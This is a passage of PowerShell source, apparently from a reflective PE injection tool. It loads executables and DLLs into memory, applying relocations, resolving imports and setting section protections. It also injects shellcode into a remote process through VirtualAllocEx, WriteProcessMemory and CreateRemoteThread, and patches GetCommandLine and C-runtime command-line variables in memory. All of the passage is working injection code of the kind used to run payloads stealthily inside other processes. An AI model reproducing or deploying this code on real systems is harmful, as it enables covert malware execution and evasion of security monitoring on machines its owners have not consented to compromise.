		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
